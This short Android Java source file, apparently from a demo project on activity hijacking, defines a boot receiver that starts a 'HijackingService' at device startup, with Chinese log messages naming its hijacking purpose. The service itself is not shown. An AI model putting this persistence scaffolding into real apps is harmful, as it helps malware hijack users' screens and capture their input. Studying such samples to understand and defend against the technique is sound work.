package com.example.hijackactivity;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class HijackingReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
            Log.w("hijacking", "开机启动");
            Intent intent2 = new Intent(context, HijackingService.class);
            context.startService(intent2);
            Log.w("hijacking", "启动用来劫持的Service");
        }

    }
}
